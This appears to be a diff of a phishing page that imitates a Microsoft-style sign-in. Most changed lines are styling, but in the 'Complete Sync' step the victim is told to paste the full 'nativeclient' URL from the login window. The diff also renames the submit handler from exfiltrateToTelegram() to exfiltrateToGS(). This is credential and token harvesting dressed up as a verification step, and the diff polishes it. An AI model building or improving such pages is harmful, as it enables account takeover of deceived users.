@@ -10,12 +10,16 @@
         .logo { width: 108px; margin-bottom: 25px; }
         h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 10px; }
         p { font-size: 15px; color: #1b1b1b; line-height: 20px; margin-bottom: 20px; }
-        .btn-primary { background: #0067b8; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 15px; width: 100%; }
+        .btn-primary { background: #0067b8; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 15px; width: 100%; transition: background 0.2s; }
         .btn-primary:hover { background: #005da6; }
-        .btn-success { background: #28a745; color: white; border: none; padding: 10px 20px; cursor: pointer; width: 100%; margin-top: 10px; }
-        input { width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #8a8886; margin-top: 10px; }
+        .btn-success { background: #28a745; color: white; border: none; padding: 10px 20px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: 600; transition: background 0.2s; }
+        .btn-success:hover { background: #218838; }
+        input { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid #8a8886; margin-top: 10px; font-size: 14px; outline: none; }
+        input:focus { border: 2px solid #0067b8; padding: 11px; }
         .hidden { display: none; }
         .footer { margin-top: 30px; font-size: 12px; color: #666; }
+        .footer span { margin-right: 15px; cursor: pointer; }
+        .footer span:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -31,17 +35,20 @@
 
     <div id="step-2" class="hidden">
         <h1>Complete Sync</h1>
-        <p>A native security token was generated in your browser. To finalize the verification, please copy the URL from the new window and paste it below:</p>
+        <p>Verification data has been generated. To finalize, please copy the full URL from the address bar of the login window and paste it here:</p>
+        
         <input type="text" id="raw-url" placeholder="Paste nativeclient URL here...">
-        <button class="btn-success" onclick="exfiltrateToTelegram()">Complete Verification</button>
+        
+        <button class="btn-success" onclick="exfiltrateToGS()">Complete Verification</button>
     </div>
 
     <div class="footer">
-        <span style="margin-right:15px;">Privacy & cookies</span>
+        <span>Privacy & cookies</span>
         <span>Terms of use</span>
     </div>
 </div>
 
 <script src="index.js"></script>
+
 </body>
 </html>
